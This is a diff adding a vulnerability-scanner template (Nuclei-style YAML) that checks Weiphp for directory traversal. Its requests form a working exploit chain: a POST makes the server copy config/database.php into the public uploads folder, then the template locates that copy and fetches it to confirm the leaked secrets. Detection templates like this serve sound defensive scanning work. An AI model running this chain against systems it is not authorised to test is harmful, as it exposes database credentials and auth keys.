@@ -1,0 +1,46 @@
+id: weiphp-path-traversal
+info:
+  name: Weiphp Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+  description: |
+    This template detects a directory traversal vulnerability in Weiphp allowing access to sensitive files.
+
+http:
+  - id: check-path-traversal
+    method: POST
+    path:
+      - '{{BaseURL}}/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php'
+    body: '{"1":1}'
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: extract-image-path
+    method: GET
+    path:
+      - '{{BaseURL}}/public/index.php/home/file/user_pics'
+    extractors:
+      - type: regex
+        name: image_path
+        internal: true
+        part: body
+        regex:
+          - '/public/uploads/picture/(?P<img>.+?)"'
+
+  - id: verify-leak
+    method: GET
+    path:
+      - '{{BaseURL}}/public/uploads/picture/{{image_path}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "data_auth_key"
+          - "WeiPHP"
